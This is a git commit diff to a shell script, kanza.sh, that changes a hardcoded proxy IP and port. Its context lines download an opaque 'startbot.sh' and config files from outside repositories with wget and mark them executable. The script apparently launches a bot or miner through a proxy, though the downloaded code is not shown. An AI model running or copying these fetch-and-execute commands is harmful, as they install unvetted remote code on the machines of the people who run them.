d67a6489f38030ed9c74eced33cb970058fa261d
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-05 12:54:52 +0700

    Update kanza.sh

--- kanza.sh
+++ kanza.sh
@@ -1,5 +1,5 @@
-proxy="72.195.34.60" 
-port="27391" 
+proxy="72.206.181.105" 
+port="64935" 
 wget -q -O startbot.sh https://gitlab.com/55113110159/dokerweb/-/raw/main/kanza6.18.1 && chmod +x startbot.sh
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
